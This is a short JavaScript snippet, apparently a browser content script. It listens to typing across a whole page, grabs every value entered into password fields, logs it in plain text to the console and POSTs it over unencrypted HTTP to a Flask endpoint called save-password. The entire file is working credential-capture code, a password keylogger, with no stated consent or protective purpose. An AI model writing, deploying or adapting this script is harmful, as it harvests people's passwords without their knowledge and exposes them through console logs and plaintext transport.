// Function to detect password fields and send data to the backend
function detectPasswordInput(event) {
  const passwordField = event.target;

  // Check if the field is a password input
  if (passwordField.type === "password") {
      const password = passwordField.value;

      if (password.length > 0) { // Only send if there's input
          console.log("Password detected:", password);

          // Send the detected password to the Flask backend
          fetch("http://127.0.0.1:5000/save-password", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ password: password })
        })
        
          .then(response => response.json())
          .then(data => console.log("Server response:", data))
          .catch(error => console.error("Error sending password:", error));
      }
  }
}

// Attach event listener to detect typing in password fields
document.addEventListener("input", detectPasswordInput, true);
